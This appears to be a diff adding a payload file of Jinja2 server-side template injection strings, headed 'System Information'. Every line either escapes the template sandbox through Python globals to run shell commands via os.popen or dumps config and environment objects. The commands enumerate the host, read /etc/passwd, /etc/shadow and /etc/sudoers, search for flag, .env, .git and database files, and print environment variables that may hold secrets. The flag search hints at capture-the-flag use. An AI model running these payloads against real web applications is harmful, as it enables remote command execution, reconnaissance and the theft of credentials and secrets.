@@ -1,0 +1,60 @@
+# System Information
+{{config.__class__.__init__.__globals__['os'].popen('uname -a').read()}}
+{{cycler.__init__.__globals__.os.popen('cat /etc/os-release').read()}}
+{{joiner.__init__.__globals__.os.popen('hostname').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('groups').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ifconfig').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ip addr').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('netstat -tulpn').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ss -tulpn').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('route -n').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ps aux').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ps -ef').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('top -bn1').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('echo $$').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /home').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /root').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /tmp').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /var/www').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /etc').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name "*flag*" 2>/dev/null').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name "*.conf" 2>/dev/null | head -20').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name "*.db" 2>/dev/null').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name ".git" 2>/dev/null').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name ".env" 2>/dev/null').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/hosts').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/hostname').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/group').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/sudoers').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/crontab').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/fstab').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/mtab').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/resolv.conf').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('dpkg -l | head -50').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('apt list --installed | head -50').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('rpm -qa | head -50').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('yum list installed | head -50').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('pip list').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('pip3 list').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('which gcc python perl ruby nc wget curl').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /proc/1/cgroup | grep docker').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /proc/self/status | head -20').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la /.dockerenv').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /proc/1/environ | tr "\\0" "\\n"').read()}}
+{{config.items()}}
+{{self.__init__.__globals__}}
+{{request.environ}}
+{{request.application.__globals__}}
+{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('printenv').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('set').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ps aux | grep -E "mysql|postgres|mongo|redis"').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('netstat -an | grep -E "3306|5432|27017|6379"').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('mysql --version').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('psql --version').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('redis-cli --version').read()}}
